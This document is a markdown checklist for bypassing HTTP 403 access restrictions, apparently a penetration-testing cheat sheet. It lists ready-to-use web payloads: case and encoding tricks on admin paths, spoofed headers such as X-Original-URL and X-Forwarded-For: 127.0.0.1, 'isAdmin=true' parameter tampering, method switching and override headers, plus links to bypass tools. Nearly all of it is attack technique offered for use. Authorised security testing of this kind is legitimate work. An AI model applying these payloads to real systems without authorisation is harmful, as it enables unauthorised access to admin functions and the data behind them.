
# 403 Bypass Checklist

## Understanding HTTP Errors
- **401 Unauthorized**: Authentication required. Indicates the user is not logged in or lacks the proper credentials.
- **403 Forbidden**: The server understands the request but refuses to authorize it. This can happen even for authenticated users due to restrictions (e.g., permissions, IP filtering, etc.).

---

## Techniques for Bypassing 403 Errors

### 1. URL Manipulation
- Variations in the URL might bypass restrictions. Try the following:
  - `/admin` → 403  
    - `/Admin` → 200  
    - `/AdMin` → 200  
    - `/admin/` → 200  
    - `/admin/.` → 200  
    - `//admin//` → 200  
    - `/.;/admin` → 200  
    - `/./admin/..` → 200  
    - `/admin.json` → 200  
    - `/;/admin` → 200  
    - `//;//admin` → 200  
    - `/admi%6e` → 200  
    - `/%2e/admin` → 200  
    - `/admin..;/` → 200  

- **Fuzzing URLs**:
  - Use tools like *ffuf*, *dirsearch*, or *burp intruder* to test endpoint variations:
    - `/FUZZ/admin`
    - `/admin/FUZZ`
    - `/adminFUZZ`

### 2. Header Manipulation
- Modify HTTP headers to bypass 403 restrictions. Test using tools like Burp Suite's *Param Miner*. Examples:
  - Add or modify headers:
    ```http
    GET /anything HTTP/1.1
    Host: target.com
    X-Original-URL: /admin
    ```
  - Other header options:
    - `X-Rewrite-URL: /admin`
    - `X-Forwarded-For: 127.0.0.1`
    - `X-Forwarded: 127.0.0.1`
    - `Forwarded-For: 127.0.0.1`
    - `X-Remote-IP: 127.0.0.1`
    - `Host: localhost`

### 3. Parameter Tampering
- Modify query or POST parameters:
  - Example 1:
    - Original: `isAdmin=false`
    - Tampered: `isAdmin=true`
  - Example 2:
    - Original: `?view=restricted`
    - Tampered: `?view=public`
- **Remove Restrictive Parameters**:
  - Sometimes, removing certain parameters can bypass restrictions:
    - Original: `?auth=required`
    - Tampered: Remove `auth=required`.

### 4. HTTP Method Switching
- Change the HTTP method:
  - Example:
    ```http
    GET /admin HTTP/1.1
    Host: target.com
    ```
    Change to:
    ```http
    POST /admin HTTP/1.1
    Host: target.com
    ```

- Add method override headers:
  ```http
  POST /admin HTTP/1.1
  Host: target.com
  X-http-method-override: GET
  ```

### 5. Use Automation Tools
- Leverage automation tools for efficient testing:
  - **Burp Suite Extensions**:
    - Install "403 Bypasser" via the BApp store.
  - **GitHub Repositories**:
    - [iamj0ker/bypass-403](https://github.com/iamj0ker/bypass-403)
    - [Dheerajmadhukar/4-ZERO-3](https://github.com/Dheerajmadhukar/4-ZERO-3)
    - [diablo-101/403-bypass](https://github.com/diablo-101/403-bypass)

> **Tip**: Use multiple tools for better results, as one tool might miss certain bypass opportunities that another could find.
